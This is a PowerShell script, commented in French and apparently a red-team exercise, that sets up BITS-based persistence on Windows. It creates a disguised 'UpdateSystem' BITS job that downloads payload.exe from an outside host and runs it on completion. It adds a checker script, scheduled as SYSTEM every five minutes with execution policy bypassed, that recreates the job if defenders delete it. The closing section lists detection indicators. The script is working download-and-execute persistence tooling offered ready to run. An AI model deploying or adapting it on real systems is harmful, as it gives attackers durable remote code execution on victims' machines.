# ============================================================
# BITS Persistence - Exercice Complet avec Gestion d'Erreurs
# ============================================================

# Configuration
$JobName        = "UpdateSystem"
$PayloadUrl     = "https://mechantvilaincontenue.com/payload.exe"
$DestPath       = "C:\Users\Public\update.exe"
$LogFile        = "C:\Windows\Temp\bits_persistence.log"
$CheckerScript  = "C:\Windows\Temp\checker.ps1"
$TaskName       = "BITS_Persistence_Monitor"
$MaxRetries     = 3
$RetryDelay     = 5

# Fonction de logging
function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogMessage = "[$Timestamp] [$Level] $Message"
    Write-Host $LogMessage
    Add-Content $LogFile $LogMessage
}

Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "BITS Persistence Exercice - Démarrage" -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan

try {
    # ============================================================
    # ÉTAPE 1-2: Énumération des jobs existants
    # ============================================================
    Write-Host "`n[*] ÉTAPE 1-2: Énumération des jobs BITS existants..." -ForegroundColor Cyan
    Write-Log "Début de l'énumération des jobs BITS"
    
    $existingJobs = bitsadmin /list /allusers 2>&1
    if ($existingJobs) {
        Write-Log "Jobs BITS existants détectés:" "INFO"
        Write-Host $existingJobs
        Write-Log "Jobs détectés: $($existingJobs | Measure-Object -Line | Select-Object -ExpandProperty Lines) lignes"
    } else {
        Write-Log "Aucun job BITS actif détecté" "INFO"
    }

    # Vérifier si notre job existe déjà
    $jobExists = bitsadmin /list /allusers 2>&1 | Select-String $JobName
    if ($jobExists) {
        Write-Log "Job '$JobName' trouvé, suppression en cours..." "WARN"
        bitsadmin /complete $JobName 2>$null
        bitsadmin /delete $JobName 2>$null
        Write-Log "Job '$JobName' supprimé avec succès" "INFO"
    }

    # ============================================================
    # ÉTAPE 3: Création du job BITS avec gestion d'erreur
    # ============================================================
    Write-Host "`n[*] ÉTAPE 3: Création du job BITS..." -ForegroundColor Cyan
    Write-Log "Création du job BITS: $JobName avec URL: $PayloadUrl"
    
    $retryCount = 0
    $jobCreated = $false

    while ($retryCount -lt $MaxRetries -and -not $jobCreated) {
        try {
            bitsadmin /create $JobName 2>$null | Out-Null
            if ($LASTEXITCODE -eq 0) {
                Write-Log "Job '$JobName' créé avec succès (Tentative $($retryCount + 1)/$MaxRetries)" "INFO"
                
                # Ajout du fichier à télécharger
                bitsadmin /addfile $JobName "$PayloadUrl" "$DestPath" 2>$null | Out-Null
                if ($LASTEXITCODE -eq 0) {
                    Write-Log "Fichier ajouté au job: $PayloadUrl -> $DestPath" "INFO"
                    $jobCreated = $true
                } else {
                    Write-Log "Erreur lors de l'ajout du fichier" "ERROR"
                    bitsadmin /delete $JobName 2>$null
                    throw "Failed to add file to BITS job"
                }
            }
        } catch {
            $retryCount++
            Write-Log "Erreur lors de la création du job: $_. Tentative $retryCount/$MaxRetries" "ERROR"
            if ($retryCount -lt $MaxRetries) {
                Start-Sleep -Seconds $RetryDelay
            }
        }
    }

    if (-not $jobCreated) {
        Write-Log "Impossible de créer le job après $MaxRetries tentatives" "ERROR"
        exit 1
    }

    # ============================================================
    # ÉTAPE 4: Configuration de la persistance
    # ============================================================
    Write-Host "`n[*] ÉTAPE 4: Configuration de la persistance..." -ForegroundColor Cyan
    Write-Log "Configuration des paramètres de persistance"

    # SetNotifyCmdLine: Commande à exécuter quand le job termine
    bitsadmin /SetNotifyCmdLine $JobName "$DestPath" "" 2>$null
    if ($LASTEXITCODE -eq 0) {
        Write-Log "SetNotifyCmdLine configuré: $DestPath sera exécuté après téléchargement" "INFO"
    } else {
        Write-Log "Erreur SetNotifyCmdLine" "ERROR"
    }

    # SetNotifyFlags: Flags pour les notifications (1=completion, 2=modification, 3=both, 4=error)
    # Flag 3 = notification sur completion ET erreur
    bitsadmin /SetNotifyFlags $JobName 3 2>$null
    if ($LASTEXITCODE -eq 0) {
        Write-Log "SetNotifyFlags configuré (Flag 3: Completion + Error notifications)" "INFO"
    } else {
        Write-Log "Erreur SetNotifyFlags" "ERROR"
    }

    # Propriété de persistance: le job persiste après redémarrage OS
    # (Propriété par défaut pour BITS)
    Write-Log "Job BITS configuré pour persister après redémarrage système" "INFO"

    # ============================================================
    # ÉTAPE 5: Lancement du job avec gestion d'erreur et retry
    # ============================================================
    Write-Host "`n[*] ÉTAPE 5: Lancement du job avec gestion d'erreur..." -ForegroundColor Cyan
    Write-Log "Démarrage du job BITS"

    bitsadmin /resume $JobName 2>$null
    if ($LASTEXITCODE -eq 0) {
        Write-Log "Job '$JobName' aktivé et en attente de téléchargement" "INFO"
        Write-Host "[+] Job BITS lancé avec succès" -ForegroundColor Green
    } else {
        Write-Log "Erreur lors du lancement du job" "ERROR"
        bitsadmin /delete $JobName 2>$null
        exit 1
    }

    # Afficher le statut du job
    Write-Log "Requête du statut du job:"
    $jobStatus = bitsadmin /info $JobName /verbose 2>&1
    Write-Log $jobStatus

    # ============================================================
    # ÉTAPE 6: Développement du checker script avec monitoring
    # ============================================================
    Write-Host "`n[*] ÉTAPE 6: Création du script checker et scheduling..." -ForegroundColor Cyan
    Write-Log "Création du script checker de reconnexion"

    $checkerScript = @'
# Script Checker - Re-crée le job BITS s'il est supprimé
$JobName        = "UpdateSystem"
$PayloadUrl     = "https://mechantvilaincontenue.com/payload.exe"
$DestPath       = "C:\Users\Public\update.exe"
$LogFile        = "C:\Windows\Temp\bits_persistence.log"
$MaxRetries     = 3

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $LogMessage = "[$Timestamp] [$Level] [CHECKER] $Message"
    Add-Content $LogFile $LogMessage
}

Write-Log "Checker script exécuté - Vérification du job BITS"

try {
    # Vérifier si le job existe
    $jobExists = bitsadmin /list /allusers 2>&1 | Select-String $JobName
    
    if (-not $jobExists) {
        Write-Log "Job '$JobName' non trouvé - Récréation en cours" "WARN"
        
        # Récréer le job avec retry
        $retryCount = 0
        $jobCreated = $false
        
        while ($retryCount -lt $MaxRetries -and -not $jobCreated) {
            try {
                bitsadmin /create $JobName 2>$null | Out-Null
                bitsadmin /addfile $JobName "$PayloadUrl" "$DestPath" 2>$null | Out-Null
                bitsadmin /SetNotifyCmdLine $JobName "$DestPath" "" 2>$null
                bitsadmin /SetNotifyFlags $JobName 3 2>$null
                bitsadmin /resume $JobName 2>$null
                Write-Log "Job '$JobName' récréé avec succès (Tentative $($retryCount + 1)/$MaxRetries)" "INFO"
                $jobCreated = $true
            } catch {
                $retryCount++
                Write-Log "Erreur lors de la récréation du job: $_. Tentative $retryCount" "ERROR"
                Start-Sleep -Seconds 5
            }
        }
        
        if ($jobCreated) {
            Write-Log "Persistance rétablie avec succès" "INFO"
        } else {
            Write-Log "Impossible de recréer le job après $MaxRetries tentatives" "ERROR"
        }
    } else {
        Write-Log "Job '$JobName' actif - Pas d'action requise" "INFO"
    }
} catch {
    Write-Log "Erreur dans le checker script: $_" "ERROR"
}
'@

Set-Content $CheckerScript $checkerScript
Write-Log "Script checker créé: $CheckerScript"

# ============================================================
# Scheduling du checker script
# ============================================================
Write-Host "`n[*] Scheduling du script checker avec Scheduled Task..." -ForegroundColor Cyan
Write-Log "Création de la tâche planifiée Windows"

try {
    # Suppression de la tâche si elle existe
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
    
    # Créer la tâche planifiée qui s'exécute toutes les 5 minutes
    $trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 1000) -Once -At (Get-Date)
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$CheckerScript`""
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    
    Register-ScheduledTask -TaskName $TaskName `
                          -Trigger $trigger `
                          -Action $action `
                          -Principal $principal `
                          -Settings $settings `
                          -Description "BITS Persistence Monitor - Re-crée le job si supprimé" `
                          -Force | Out-Null
    
    Write-Log "Tâche planifiée '$TaskName' créée (exécution toutes les 5 minutes)" "INFO"
    Write-Host "[+] Scheduled Task créée avec succès" -ForegroundColor Green
} catch {
    Write-Log "Erreur lors de la création de la Scheduled Task: $_" "ERROR"
}

    # ============================================================
    # ÉTAPE 7: Logging détaillé pour analyse forensique
    # ============================================================
    Write-Host "`n[*] ÉTAPE 7: Configuration du logging pour analyse forensique..." -ForegroundColor Cyan
    Write-Log "Configuration du monitoring et logging"
    
    # Afficher les chemins clés pour l'analyse forensique
    Write-Log "Fichiers et emplacements clés:" "INFO"
    Write-Log "  - Log BITS Persistence: $LogFile" "INFO"
    Write-Log "  - Checker Script: $CheckerScript" "INFO"
    Write-Log "  - Dest Payload: $DestPath" "INFO"
    Write-Log "  - Task Schedulée: $TaskName" "INFO"
    
    Write-Log "Indicateurs de détection (IOCs):" "INFO"
    Write-Log "  - Événements BITS dans Event Viewer (ID: 3, 4, 16387)" "INFO"
    Write-Log "  - Présence du job: bitsadmin /list /allusers" "INFO"
    Write-Log "  - Logs PowerShell: C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx" "INFO"
    
    Write-Host "`n============================================================" -ForegroundColor Green
    Write-Host "[+] BITS Persistence configurée avec succès !" -ForegroundColor Green
    Write-Host "============================================================" -ForegroundColor Green
    Write-Log "Processus de persistance BITS complété avec succès" "INFO"

} catch {
    Write-Host "`n[✗] Erreur critique: $_" -ForegroundColor Red
    Write-Log "Erreur critique lors du setup: $_" "ERROR"
    exit 1
}